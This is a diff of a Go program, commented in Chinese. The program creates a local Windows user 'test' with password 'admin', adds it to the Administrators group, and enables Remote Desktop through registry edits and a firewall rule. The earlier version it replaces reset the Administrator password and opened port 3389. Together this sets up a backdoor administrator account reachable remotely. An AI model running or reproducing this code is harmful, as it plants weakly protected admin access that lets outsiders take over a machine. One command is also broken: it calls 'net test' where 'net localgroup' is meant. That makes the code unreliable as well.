@@ -1,84 +1,77 @@
 package main
 
 import (
-	"fmt"
+	"log"
 	"os/exec"
 )
 
+// createUser 用于创建新用户
+func createUser(username, password string) error {
+	// 执行 net user 命令创建新用户
+	cmd := exec.Command("net", "user", username, password, "/add")
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		log.Printf("创建用户时出错: %s，输出信息: %s", err, string(output))
+		return err
+	}
+	log.Printf("用户 %s 创建成功", username)
+	return nil
+}
+
+// addUserToAdminGroup 将用户添加到管理员组
+func addUserToAdminGroup(username string) error {
+	// 执行 net localgroup 命令将用户添加到管理员组
+	cmd := exec.Command("net", "test", "Administrators", username, "/add")
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		log.Printf("将用户添加到管理员组时出错: %s，输出信息: %s", err, string(output))
+		return err
+	}
+	log.Printf("用户 %s 已添加到管理员组", username)
+	return nil
+}
+
+// enableRDP 开启远程桌面协议
+func enableRDP() error {
+	// 执行 reg add 命令修改注册表以开启 RDP
+	commands := []string{
+		`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`,
+		`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f`,
+		`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowTSConnections /t REG_DWORD /d 1 /f`,
+		`netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes`,
+	}
+
+	for _, cmdStr := range commands {
+		cmd := exec.Command("cmd", "/C", cmdStr)
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			log.Printf("执行命令 %s 时出错: %s，输出信息: %s", cmdStr, err, string(output))
+			return err
+		}
+		log.Printf("命令 %s 执行成功", cmdStr)
+	}
+	log.Println("远程桌面协议已开启")
+	return nil
+}
+
 func main() {
-	// 1. 设置管理员用户密码
-	username := "Administrator" // 或当前用户名
+	username := "test"
 	password := "admin"
-	fmt.Println("正在设置管理员密码...")
-	setPassword(username, password)
 
-	// 2. 启用远程桌面功能
-	fmt.Println("正在启用远程桌面...")
-	enableRemoteDesktop()
-
-	// 3. 开启远程访问端口（3389）
-	fmt.Println("正在开启远程访问端口 3389...")
-	openPort(3389)
-
-	// 4. 检查远程桌面状态
-	fmt.Println("正在检查远程桌面状态...")
-	checkRemoteDesktopStatus()
-
-	fmt.Println("操作完成！")
-}
-
-// 设置管理员用户密码
-func setPassword(username, password string) {
-	cmd := exec.Command("net", "user", username, password)
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		fmt.Println("设置密码失败:", err)
-		fmt.Println("输出:", string(output))
+	// 创建新用户
+	if err := createUser(username, password); err != nil {
 		return
 	}
-	fmt.Println("密码设置成功！")
-}
 
-// 启用远程桌面功能
-func enableRemoteDesktop() {
-	cmd := exec.Command("reg", "add", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
-		"/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "0", "/f")
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		fmt.Println("启用远程桌面失败:", err)
-		fmt.Println("输出:", string(output))
+	// 将用户添加到管理员组
+	if err := addUserToAdminGroup(username); err != nil {
 		return
 	}
-	fmt.Println("远程桌面已启用！")
-}
 
-// 开启指定端口
-func openPort(port int) {
-	ruleName := fmt.Sprintf("RemoteDesktop_Port_%d", port)
-	cmd := exec.Command("netsh", "advfirewall", "firewall", "add", "rule",
-		"name="+ruleName,
-		"dir=in",
-		"action=allow",
-		"protocol=TCP",
-		"localport="+fmt.Sprintf("%d", port),
-	)
-
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		fmt.Println("开启端口失败:", err)
-		fmt.Println("输出:", string(output))
+	// 开启远程桌面协议
+	if err := enableRDP(); err != nil {
 		return
 	}
-	fmt.Printf("端口 %d 已开启！\n", port)
-}
 
-// 检查远程桌面状态
-func checkRemoteDesktopStatus() {
-	cmd := exec.Command("reg", "query", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "/v", "fDenyTSConnections")
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		fmt.Println("检查远程桌面状态失败:", err)
-		return
-	}
-	fmt.Println("远程桌面状态:\n", string(output))
+	log.Println("操作完成")
 }
